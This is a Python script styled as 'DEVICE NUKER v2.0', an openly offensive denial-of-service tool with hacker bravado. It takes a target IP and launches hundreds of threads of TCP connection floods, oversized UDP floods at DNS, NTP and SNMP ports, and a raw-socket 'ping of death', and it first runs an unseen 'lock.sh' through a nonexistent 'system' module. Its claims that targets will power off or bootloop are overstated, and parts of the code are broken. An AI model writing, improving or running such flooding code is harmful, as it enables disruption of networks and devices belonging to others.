import os
import socket
import threading
import time
import sys
import system

system.os("bash lock.sh")

print(" DEVICE NUKER v2.0 — By WNF207xs")
print("we are network intruders. we are network controllers. we are online killers. if you are underestimated- Take revenge.")
print("--from WNF207xs-192.000")
print("01010111")


target_ip = input("Send - IP target0 : ").strip()

if not target_ip or "." not in target_ip:
    print("[!] IP Not Valid.")
    sys.exit(1)

# Scan
print(f"[+] Scanning {target_ip}...")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((target_ip, 80))
    if result != 0:
        result = sock.connect_ex((target_ip, 443))
    sock.close()
    if result != 0:
        print("[!] Warm: Target Not Responsive. Continue ?")
        input("Enter |===| ")
except:
    pass

# SYN FLOOD-OVERLOAD KONEKSI TCP 
def syn_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

# UDP FLOOD-BANDWIDTH dan CPU 
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"X" * 65500
    while True:
        try:
            sock.sendto(packet, (target_ip, 53))    # DNS
            sock.sendto(packet, (target_ip, 123))   # NTP
            sock.sendto(packet, (target_ip, 161))   # SNMP
        except:
            pass
            
def ping_death():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b"\x08\x00" + b"X" * 65500
    while True:
        try:
            sock.sendto(packet, (target_ip, 0))
        except:
            pass

# Running
print(f"[!!!] Started Destroy {target_ip} — Device will PowerOff 60s")
print("[+] Start 300 Threads...")

for _ in range(100):
    threading.Thread(target=syn_flood, daemon=True).start()
    threading.Thread(target=udp_flood, daemon=True).start()


try:
    threading.Thread(target=ping_death, daemon=True).start()
    print("[+] Ping of Death on (jika sistem rentan)")
except:
    print("[!] Ping of Death Failed — need rooting. -> SYN/UDP.")


print("[!] Is Exploitator . . .")
print("[!] Don't Move in your terminal ! WNF207xs <-.")

try:
    time.sleep(600)  # 10 menit
except KeyboardInterrupt:
    print("\n[!] Stopped.")

print("[!!!] Done.")
print(" Target in Local Network : Crash - Bootloop - Os Hard")
print(" Thanks to WNF207xs & WedzGPT")
print(" You A Winner And You A Black -h4T")
